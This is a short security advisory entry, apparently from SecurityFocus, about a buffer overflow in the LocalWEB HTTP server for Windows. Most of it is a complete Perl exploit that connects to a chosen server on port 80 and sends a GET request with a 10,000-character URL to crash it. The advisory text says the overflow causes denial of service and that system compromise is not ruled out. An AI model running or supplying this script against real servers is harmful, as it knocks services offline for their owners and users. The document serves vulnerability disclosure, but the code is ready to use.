source: http://www.securityfocus.com/bid/1423/info

LocalWEB is a freeware HTTP server for the Windows suite of operating systems. Certain versions of this software are vulnerable to a remotely exploitable buffer overflow attack. This attack can instrumented by sending the web server (via port 80) a malformed URL. The net result is a denial of service, however a remotely exploitable buffer overflow leading to a system compromise has not been ruled out. 


# ./$0.pl -s <server>
#
# Malformed GET URL request DoS
#
use Getopt::Std;
use Socket;

getopts('s:', \%args);
if(!defined($args{s})){&usage;}

my($serv,$port,$foo,$number,$data,$buf,$in_addr,$paddr,$proto);

$foo = "A"; # this is the NOP
$number = "10000"; # this is the total number of NOP
$data .= $foo x $number; # result of $foo times $number
$serv = $args{s}; # remote server
$port = 80; # remote port, default is 80
$buf = "GET /$data HTTP/1.0\r\n\r\n"; # issue this response to the
server

$in_addr = (gethostbyname($serv))[4] || die("Error: $!\n");
$paddr = sockaddr_in($port, $in_addr) || die ("Error: $!\n");
$proto = getprotobyname('tcp') || die("Error: $!\n");

socket(S, PF_INET, SOCK_STREAM, $proto) || die("Error: $!");
connect(S, $paddr) ||die ("Error: $!");
select(S); $| = 1; select(STDOUT);
print S "$buf";

print("Data has been successfully sent to $serv\n");

sub usage {die("\n\n$0 -s <server>\n\n");} 
